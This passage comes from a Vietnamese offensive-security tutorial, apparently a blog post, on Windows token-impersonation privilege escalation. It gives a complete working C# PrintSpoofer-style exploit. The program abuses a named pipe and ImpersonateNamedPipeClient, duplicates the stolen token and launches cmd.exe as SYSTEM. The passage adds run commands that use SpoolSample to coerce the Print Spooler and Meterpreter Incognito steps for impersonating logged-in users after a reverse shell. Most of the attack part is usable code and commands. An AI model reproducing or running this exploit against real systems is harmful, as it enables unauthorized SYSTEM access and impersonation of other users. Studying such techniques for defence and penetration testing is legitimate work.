- Đối số thứ 2 "dwDesiredAccess" ta yêu cầu toàn quyền truy cập vào access token với value 0xF01FF

- ĐỐi số thứ 3 "lpTokenAttributes"  ta sẽ sử dụng security descript mặc định thành NULL (IntPtr.Zero)

- Đối số thứ 4 "ImpersonationLevel" phải được đặt thành "SecurityImpersonation" là quyền mà chúng ta hiện có với access token. Giá trị này là "2"

- Đối số thứ 5 "TokenType" ta chỉ định access token là Primary với giá trị "TokenPrimary" tương đương với value 1

- Đố số cuối cùng "phNewToken" là một con trỏ được điền vào cùng với handler cho access token được sao chép

Ta có code như sau

```csharp
IntPtr hSystemToken = IntPtr.Zero;
DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
```

Sau khi access token mạo danh được nhân bản và trở thành access token primary, ta có thể sử dụng **CreateProcessWithToken** để tạo cmd.exe dưới quyền SYSTEM

Nguyên mẫu của hàm này như sau

```csharp
BOOL CreateProcessWithTokenW(
  [in]                HANDLE                hToken,
  [in]                DWORD                 dwLogonFlags,
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);

```

* Đối số hToken là giá trị access token mới được ăn cắp 

* Đối số dwLogonFlags là tùy chọn đăng nhập - mặc định giá trị là 0

* Đối số lpApplicationName đặt giá trị mặc định là NULL

* Đối số "lpCommandLine" là đường dẫn đầy đủ của cmd.exe

* Đối số  "dwCreationFlags", "lpEnosystem" , "lpCurrentDirectory" đặt thành 0, NULL, NULL

* Đối với 2 đối số cuối cùng , "lpStartupInfo" và "lpProcessInformation" chúng ta phải tự xác định STRUCT như sau


```csharp
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
```

```
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
STARTUPINFO si = new STARTUPINFO();
si.cb = Marshal.SizeOf(si);
CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
```


Tuốt tuồn tuột ta có chương trình

```csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{

    class Program
    {
   
    [StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}

   [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
        
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);



        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);
            
            IntPtr hSystemToken = IntPtr.Zero;
	    DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
	    
	    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
STARTUPINFO si = new STARTUPINFO();
si.cb = Marshal.SizeOf(si);
CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);

        }
    }
}
```

**Khởi chạy**

Bước 1. Biên dịch chương trình , khởi chạy Pipe 

```
PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
```

Bước 2. Sử dụng SpoolSample để ép Print Spooler kết nối tới Pipe

```
SpoolSample.exe srv01 srv01/pipe/test
```

Leo thang đặc quyền thành công !!!

Với cuộc tấn công này, chúng ta có thể nâng cao đặc quyền của mình từ một tài khoản đặc quyền thấp, sở hữu 
`SeImpersonatePrivilege` thành SYSTEM trên bất kỳ hệ thống Windows hiện đại nào, bao gồm Windows 2019 và các phiên bản mới nhất của Windows 10.

# 3. Giả mạo đặc quyền với Incognito

(Ngữ cảnh này thực hiện khi đã có RCE ở phần 2) 

Trong phần này, chúng ta sẽ sử dụng module của Meterpreter - Incognito để đóng giả bất kỳ người dùng nào đã đăng nhập và thực thi code trong ngữ cảnh của họ mà không cần truy cập vào bất kỳ mật khẩu hay hàm băm nào.

Để chứng minh điều này, ta tạo 1 revershell với meterpreter, sau đó chuyển sang máy chủ vừa tấn công . Thực thi shell với cmd.exe quyền SYSTEM ở phần trước.

Bước 1. Load incognito

[![Screenshot-from-2022-05-25-00-33-01.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-25-00-33-01.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-25-00-33-01.png)

Bước 2. Sử dụng "list_tokens -u" để liệt kê các access token 

[![Screenshot-from-2022-05-25-00-39-17.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-25-00-39-17.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-25-00-39-17.png)

Bước 3. Sử dụng "impersonate_token" để mạo danh người dùng

[![Screenshot-from-2022-05-25-00-39-45.png](https://0xbadcode.ml/uploads/images/gallery/2022-05/scaled-1680-/Screenshot-from-2022-05-25-00-39-45.png)](https://0xbadcode.ml/uploads/images/gallery/2022-05/Screenshot-from-2022-05-25-00-39-45.png)